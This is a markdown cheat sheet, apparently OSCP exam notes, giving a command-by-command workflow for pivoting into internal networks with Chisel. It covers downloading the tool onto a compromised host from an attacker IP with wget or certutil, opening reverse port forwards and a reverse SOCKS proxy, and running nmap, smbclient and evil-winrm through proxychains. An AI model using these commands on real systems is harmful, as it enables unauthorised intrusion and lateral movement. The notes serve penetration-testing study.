# Pivoting – Chisel

## Purpose

This file provides a structured workflow for using Chisel to pivot into internal networks.

Core rules:
- Chisel creates tunnels over HTTP
- Works well in restricted environments
- Supports port forwarding and SOCKS proxying
- Reverse tunnels are most common in OSCP

---

## 0. Mental Model

You have:

[ATTACKER] → [COMPROMISED HOST] → [INTERNAL NETWORK]

Goal:
→ route traffic through compromised host

---

## 1. Transfer Chisel

On attacker:
python3 -m http.server 8000

On target:
wget http://<ATTACKER_IP>:8000/chisel.exe

OR:

certutil -urlcache -split -f http://<ATTACKER_IP>:8000/chisel.exe chisel.exe

---

## 2. Start Chisel Server (ATTACKER)

./chisel server -p 8000 --reverse

---

## 3. Reverse Port Forward (MOST COMMON)

On target:

chisel.exe client <ATTACKER_IP>:8000 R:4444:127.0.0.1:3389

---

## 4. Use Tunnel

Now attacker connects to:

127.0.0.1:4444 → target's 3389

---

## 5. Reverse SOCKS Proxy (CRITICAL)

On attacker:

./chisel server -p 8000 --reverse

---

On target:

chisel.exe client <ATTACKER_IP>:8000 R:socks

---

## 6. Configure Proxychains

Edit:

/etc/proxychains.conf

Add:

socks5 127.0.0.1 1080

---

## 7. Use Proxychains

Example:

proxychains nmap -sT -Pn <internal_ip>

proxychains smbclient -L //<internal_ip>

proxychains evil-winrm -i <internal_ip> -u user -p password

---

## 8. Forward Port (Less Common)

If direct connection possible:

Attacker:

./chisel server -p 8000

---

Target:

chisel.exe client <ATTACKER_IP>:8000 8080:internal_ip:80

---

## 9. Multi-Hop Pivoting

Chain tunnels:

ATTACKER → HOST1 → HOST2 → TARGET

Run additional chisel instances on each hop

---

## 10. Verify Connectivity

netstat -an

OR:

curl http://127.0.0.1:<port>

---

## 11. Common Use Cases

- RDP pivoting
- SMB enumeration
- internal web apps
- WinRM access
- AD enumeration

---

## 12. Common Failure Points

- firewall blocking port
- wrong IP (use internal IPs)
- proxychains misconfigured
- SOCKS not running
- AV blocking chisel

---

## 13. If Stuck

- verify listener is running
- confirm connection established
- test simple port forward first
- try different ports
- check routing

---

## 14. Quick Exploit Pattern

1. upload chisel
2. start server (attacker)
3. start client (target)
4. create SOCKS tunnel
5. configure proxychains
6. enumerate internal network

---

## 15. Mental Model

Compromised host = pivot  
Tunnel = path  
Proxy = access  
Internal network = target  

---

## 16. Golden Rules

- Use reverse mode in OSCP
- SOCKS proxy = most powerful option
- Always verify connection
- Start simple, then expand
- Proxychains is your best friend